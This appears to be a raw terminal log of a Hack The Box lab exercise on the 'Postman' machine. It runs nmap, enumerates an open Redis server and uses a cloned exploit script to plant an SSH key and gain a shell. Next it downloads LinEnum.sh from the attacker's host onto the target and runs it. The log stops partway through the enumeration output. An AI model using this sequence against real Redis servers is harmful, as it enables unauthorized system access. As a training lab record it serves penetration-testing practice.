RECON
root@kali:~/htb/postman# nmap -sC -sV -p- -vv -oA  full 10.10.10.160
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDem1MnCQG+yciWyLak5YeSzxh4HxjCgxKVfNc1LN+vE1OecEx+cu0bTD5xdQJmyKEkpZ+AVjhQo/esF09a94eMNKcp+bhK1g3wqzLyr6kwE0wTncuKD2bA9LCKOcM6W5GpHKUywB5A/TMPJ7UXeygHseFUZEa+yAYlhFKTt6QTmkLs64sqCna+D/cvtKaB4O9C+DNv5/W66caIaS/B/lPeqLiRoX1ad/GMacLFzqCwgaYeZ9YBnwIstsDcvK9+kCaUE7g2vdQ7JtnX0+kVlIXRi0WXta+BhWuGFWtOV0NYM9IDRkGjSXA4qOyUOBklwvienPt1x2jBrjV8v3p78Tzz
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIRgCn2sRihplwq7a2XuFsHzC9hW+qA/QsZif9QKAEBiUK6jv/B+UxDiPJiQp3KZ3tX6Arff/FC0NXK27c3EppI=
|   256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3FKsLVdJ5BN8bLpf80Gw89+4wUslxhI3wYfnS+53Xd
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   syn-ack ttl 63 Redis key-value store 4.0.9
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

root@kali:~/htb/postman# nmap --script redis-info -sV -p 6379 10.10.10.160
Starting Nmap 7.70 ( https://nmap.org ) at 2020-12-09 22:14 GMT
Nmap scan report for 10.10.10.160
Host is up (0.043s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
| redis-info: 
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 623
|   Used CPU (sys): 1.24
|   Used CPU (user): 0.39
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 821.52K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.14.26

ENUM REDIS
root@kali:~/htb/postman# redis-cli -h 10.10.10.160
10.10.10.160:6379> info
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-58-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:623
run_id:613e7d01368944ed763b3e223e342c68fc7638eb
tcp_port:6379
uptime_in_seconds:1591
uptime_in_days:0
hz:10
lru_clock:13716957
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:841240
used_memory_human:821.52K
used_memory_rss:3772416
used_memory_rss_human:3.60M
used_memory_peak:841240
used_memory_peak_human:821.52K
used_memory_peak_perc:100.00%
used_memory_overhead:832086
used_memory_startup:782456
used_memory_dataset:9154
used_memory_dataset_perc:15.57%
total_system_memory:941203456
total_system_memory_human:897.60M
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:4.48
mem_allocator:jemalloc-3.6.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1607550886
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:4
total_commands_processed:8
instantaneous_ops_per_sec:0
total_net_input_bytes:192
total_net_output_bytes:18547
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:09339b2fba3fb8ba917d6813c866bf99bf5c250f
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:1.33
used_cpu_user:0.41
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Cluster
cluster_enabled:0

# Keyspace

SEARCH FOR REDIS REMOTE CODE EXPLOIT
root@kali:~/htb/postman# git clone https://github.com/Avinash-acid/Redis-Server-Exploit.git
root@kali:~/htb/postman# pip install termcolor
Requirement already satisfied: termcolor in /usr/lib/python2.7/dist-packages
root@kali:~/htb/postman# cd Redis-Server-Exploit/
root@kali:~/htb/postman/Redis-Server-Exploit# ls -l
total 8
-rw-r--r-- 1 root root 1471 Dec  9 22:17 README.md
-rw-r--r-- 1 root root 2051 Dec  9 22:17 redis.py
root@kali:~/htb/postman/Redis-Server-Exploit# vim redis.py
root@kali:~/htb/postman/Redis-Server-Exploit# cp redis.py postman.py
root@kali:~/htb/postman/Redis-Server-Exploit# vim postman.py 
root@kali:~/htb/postman/Redis-Server-Exploit# cat postman.py | grep "var/lib"
		cmd4 = cmd1 + ' config set  dir' + " /var/lib/"+username+"/.ssh/"

RUN EXPLOIT TO CREATE SSH KEY PAIR AND GET USER SHELL
root@kali:~/htb/postman/Redis-Server-Exploit# python postman.py 10.10.10.160 redis
	*******************************************************************
	* [+] [Exploit] Exploiting misconfigured REDIS SERVER*
	* [+] AVINASH KUMAR THAPA aka "-Acid"                                
	*******************************************************************


	 SSH Keys Need to be Generated
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:vo/WuXGJchNYkfA3l8hF9zvzOU0vo2E3PHfdrQCpFmY acid_creative
The key's randomart image is:
+---[RSA 2048]----+
|        .... .o .|
|         ..o o o.|
|          o = o .|
|         o o o  .|
|        E +    +.|
|       + o + o .@|
|        =.=.* BoX|
|       ..=o= = Bo|
|       .o.o.. .  |
+----[SHA256]-----+
	 Keys Generated Successfully
OK
OK
OK
OK
OK
OK
	You'll get shell in sometime..Thanks for your patience
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
redis@Postman:~$ hostname
Postman
redis@Postman:~$ pwd
/var/lib/redis
redis@Postman:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.3 LTS
Release:	18.04
Codename:	bionic
redis@Postman:~$ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.160  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:5327  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:5327  prefixlen 64  scopeid 0x0<global>

CANNOT READ USER FLAG
redis@Postman:~$ ls -l /home/Matt
total 4
-rw-rw---- 1 Matt Matt 33 Dec  9 21:55 user.txt
redis@Postman:~$ cat /home/Matt/user.txt
cat: /home/Matt/user.txt: Permission denied

PRIVESC

COPY LINUX PRIV CHECKER TO POSTMAN
root@kali:~/htb/postman# cp /root/old/htb/Tools/linuxprivchecker.py .
root@kali:~/htb/postman# python -m SimpleHTTPServer 80

RUN LINUX PRIV CHECKER SCRIPT
redis@Postman:~$ python linuxprivchecker.py > lpc.txt
redis@Postman:~$ which python3
/usr/bin/python3
redis@Postman:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

=================================================================================================
LINUX PRIVILEGE ESCALATION CHECKER
=================================================================================================

[*] GETTING BASIC SYSTEM INFO...

[+] Kernel
    Linux version 4.15.0-58-generic (buildd@lcy01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019

[+] Hostname
    Postman

[+] Operating System
    Ubuntu 18.04.3 LTS \n \l

[*] GETTING NETWORKING INFO...

[+] Interfaces
    ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    inet 10.10.10.160  netmask 255.255.255.0  broadcast 10.10.10.255
    inet6 fe80::250:56ff:feb9:5327  prefixlen 64  scopeid 0x20<link>
    inet6 dead:beef::250:56ff:feb9:5327  prefixlen 64  scopeid 0x0<global>
    ether 00:50:56:b9:53:27  txqueuelen 1000  (Ethernet)
    RX packets 68768  bytes 4249078 (4.2 MB)
    RX errors 0  dropped 0  overruns 0  frame 0
    TX packets 67931  bytes 5119562 (5.1 MB)
    TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
    device interrupt 19  base 0x2000
    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
    inet 127.0.0.1  netmask 255.0.0.0
    inet6 ::1  prefixlen 128  scopeid 0x10<host>
    loop  txqueuelen 1000  (Local Loopback)
    RX packets 9422  bytes 669656 (669.6 KB)
    RX errors 0  dropped 0  overruns 0  frame 0
    TX packets 9422  bytes 669656 (669.6 KB)
    TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[+] Netstat
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      623/redis-server 0.
    tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
    tcp        0     36 10.10.10.160:22         10.10.14.26:40790       ESTABLISHED -
    tcp6       0      0 ::1:6379                :::*                    LISTEN      623/redis-server 0.
    tcp6       0      0 :::80                   :::*                    LISTEN      -
    tcp6       0      0 :::22                   :::*                    LISTEN      -
    udp        0      0 0.0.0.0:10000           0.0.0.0:*                           -
    udp        0      0 127.0.0.53:53           0.0.0.0:*                           -

[+] Route
    Kernel IP routing table
    Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
    default         _gateway        0.0.0.0         UG    0      0        0 ens33
    10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens33



LINENUM
redis@Postman:~$ wget 10.10.14.26/LinEnum.sh
--2020-12-10 01:34:05--  http://10.10.14.26/LinEnum.sh
Connecting to 10.10.14.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh         100%[================>]  45.54K  --.-KB/s    in 0.06s   

2020-12-10 01:34:05 (715 KB/s) - ‘LinEnum.sh’ saved [46631/46631]

redis@Postman:~$ chmod +x LinEnum.sh 
redis@Postman:~$ ./LinEnum.sh 

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Thu Dec 10 01:34:31 GMT 2020


### SYSTEM ##############################################
[-] Kernel information:
Linux Postman 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.15.0-58-generic (buildd@lcy01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.3 LTS"
NAME="Ubuntu"
VERSION="18.04.3 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.3 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


[-] Hostname:
Postman


### USER/GROUP ##########################################
[-] Current user/group info:
uid=107(redis) gid=114(redis) groups=114(redis)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             tty1                      Tue Sep 29 18:01:51 +0100 2020
Matt             pts/4    192.168.1.4      Mon Aug 26 00:04:37 +0100 2019
redis            pts/0    10.10.14.26      Wed Dec  9 22:43:39 +0000 2020


[-] Who else is logged on:
 01:34:31 up  3:39,  1 user,  load average: 0.03, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
redis    pts/0    10.10.14.26      22:43    7.00s  0.25s  0.00s /bin/bash ./LinEnum.sh


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(uuidd) gid=109(uuidd) groups=109(uuidd)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
uid=107(redis) gid=114(redis) groups=114(redis)


[-] It looks like we have some admin users:
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root root 4.0K Sep 11  2019 .
drwxr-xr-x 22 root root 4.0K Sep 30 16:14 ..
drwxr-xr-x  6 Matt Matt 4.0K Sep 11  2019 Matt


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
SSH_CONNECTION=10.10.14.26 40790 10.10.10.160 22
LANG=en_US.UTF-8
XDG_SESSION_ID=6
USER=redis
PWD=/var/lib/redis
HOME=/var/lib/redis
SSH_CLIENT=10.10.14.26 40790 22
SSH_TTY=/dev/pts/0
MAIL=/var/mail/redis
SHELL=/bin/bash
TERM=xterm-256color
SHLVL=2
LOGNAME=redis
XDG_RUNTIME_DIR=/run/user/107
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
drwxr-xr-x 2 root root  4096 Aug 25  2019 /bin
drwxr-xr-x 2 root root  4096 Sep 29 18:02 /sbin
drwxr-xr-x 2 root root 20480 Sep 29 18:02 /usr/bin
drwxr-xr-x 2 root root  4096 Apr 24  2018 /usr/games
drwxr-xr-x 2 root root  4096 Aug 25  2019 /usr/local/bin
drwxr-xr-x 2 root root  4096 Aug 24  2019 /usr/local/games
drwxr-xr-x 2 root root  4096 Aug 24  2019 /usr/local/sbin
drwxr-xr-x 2 root root  4096 Sep 29 18:02 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/bin/rbash
/bin/dash


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Aug 25  2019 .
drwxr-xr-x 82 root root 4096 Sep 29 18:02 ..
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Aug 24  2019 popularity-contest

/etc/cron.daily:
total 56
drwxr-xr-x  2 root root 4096 Aug 25  2019 .
drwxr-xr-x 82 root root 4096 Sep 29 18:02 ..
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root   77 Sep  5  2008 apt-show-versions
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug 24  2019 .
drwxr-xr-x 82 root root 4096 Sep 29 18:02 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug 24  2019 .
drwxr-xr-x 82 root root 4096 Sep 29 18:02 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Aug 24  2019 .
drwxr-xr-x 82 root root 4096 Sep 29 18:02 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Systemd timers:
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Thu 2020-12-10 01:39:00 GMT  4min 24s left Thu 2020-12-10 01:09:02 GMT  25min ago    phpsessionclean.timer        phpsessionclean.service
Thu 2020-12-10 06:43:03 GMT  5h 8min left  Wed 2020-12-09 21:54:43 GMT  3h 39min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Thu 2020-12-10 13:49:43 GMT  12h left      Wed 2020-12-09 21:54:43 GMT  3h 39min ago apt-daily.timer              apt-daily.service
Thu 2020-12-10 22:09:40 GMT  20h left      Wed 2020-12-09 22:09:40 GMT  3h 24min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Thu 2020-12-10 23:45:54 GMT  22h left      Thu 2020-12-10 01:34:31 GMT  4s ago       motd-news.timer              motd-news.service
Mon 2020-12-14 00:00:00 GMT  3 days left   Wed 2020-12-09 21:54:43 GMT  3h 39min ago fstrim.timer                 fstrim.service

6 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.160  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:5327  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:5327  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:53:27  txqueuelen 1000  (Ethernet)
        RX packets 71872  bytes 4895447 (4.8 MB)
        RX errors 0  dropped 10  overruns 0  frame 0
        TX packets 68598  bytes 5271574 (5.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 35032  bytes 2488166 (2.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 35032  bytes 2488166 (2.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[-] ARP history:
_gateway (10.10.10.2) at 00:50:56:b9:1a:f3 [ether] on ens33


[-] Nameserver(s):
nameserver 127.0.0.53


[-] Nameserver(s):
Global
          DNSSEC NTA: 10.in-addr.arpa
                      16.172.in-addr.arpa
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa
                      18.172.in-addr.arpa
                      19.172.in-addr.arpa
                      20.172.in-addr.arpa
                      21.172.in-addr.arpa
                      22.172.in-addr.arpa
                      23.172.in-addr.arpa
                      24.172.in-addr.arpa
                      25.172.in-addr.arpa
                      26.172.in-addr.arpa
                      27.172.in-addr.arpa
                      28.172.in-addr.arpa
                      29.172.in-addr.arpa
                      30.172.in-addr.arpa
                      31.172.in-addr.arpa
                      corp
                      d.f.ip6.arpa
                      home
                      internal
                      intranet
                      lan
                      local
                      private
                      test

Link 2 (ens33)
      Current Scopes: none
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no


[-] Default route:
default         _gateway        0.0.0.0         UG    0      0        0 ens33


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      623/redis-server 0. 
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:6379                :::*                    LISTEN      623/redis-server 0. 
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:10000           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   


### SERVICES #############################################
[-] Running processes:
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.9 159424  8800 ?        Ss   Dec09   0:02 /sbin/init splash
root          2  0.0  0.0      0     0 ?        S    Dec09   0:00 [kthreadd]
root          4  0.0  0.0      0     0 ?        I<   Dec09   0:00 [kworker/0:0H]
root          6  0.0  0.0      0     0 ?        I<   Dec09   0:00 [mm_percpu_wq]
root          7  0.0  0.0      0     0 ?        S    Dec09   0:00 [ksoftirqd/0]
root          8  0.0  0.0      0     0 ?        I    Dec09   0:02 [rcu_sched]
root          9  0.0  0.0      0     0 ?        I    Dec09   0:00 [rcu_bh]
root         10  0.0  0.0      0     0 ?        S    Dec09   0:00 [migration/0]
root         11  0.0  0.0      0     0 ?        S    Dec09   0:00 [watchdog/0]
root         12  0.0  0.0      0     0 ?        S    Dec09   0:00 [cpuhp/0]
root         13  0.0  0.0      0     0 ?        S    Dec09   0:00 [kdevtmpfs]
root         14  0.0  0.0      0     0 ?        I<   Dec09   0:00 [netns]
root         15  0.0  0.0      0     0 ?        S    Dec09   0:00 [rcu_tasks_kthre]
root         16  0.0  0.0      0     0 ?        S    Dec09   0:00 [kauditd]
root         17  0.0  0.0      0     0 ?        S    Dec09   0:00 [khungtaskd]
root         18  0.0  0.0      0     0 ?        S    Dec09   0:00 [oom_reaper]
root         19  0.0  0.0      0     0 ?        I<   Dec09   0:00 [writeback]
root         20  0.0  0.0      0     0 ?        S    Dec09   0:00 [kcompactd0]
root         21  0.0  0.0      0     0 ?        SN   Dec09   0:00 [ksmd]
root         22  0.0  0.0      0     0 ?        SN   Dec09   0:00 [khugepaged]
root         23  0.0  0.0      0     0 ?        I<   Dec09   0:00 [crypto]
root         24  0.0  0.0      0     0 ?        I<   Dec09   0:00 [kintegrityd]
root         25  0.0  0.0      0     0 ?        I<   Dec09   0:00 [kblockd]
root         26  0.0  0.0      0     0 ?        I<   Dec09   0:00 [ata_sff]
root         27  0.0  0.0      0     0 ?        I<   Dec09   0:00 [md]
root         28  0.0  0.0      0     0 ?        I<   Dec09   0:00 [edac-poller]
root         29  0.0  0.0      0     0 ?        I<   Dec09   0:00 [devfreq_wq]
root         30  0.0  0.0      0     0 ?        I<   Dec09   0:00 [watchdogd]
root         32  0.0  0.0      0     0 ?        I    Dec09   0:05 [kworker/0:1]
root         34  0.0  0.0      0     0 ?        S    Dec09   0:00 [kswapd0]
root         35  0.0  0.0      0     0 ?        I<   Dec09   0:00 [kworker/u257:0]
root         36  0.0  0.0      0     0 ?        S    Dec09   0:00 [ecryptfs-kthrea]
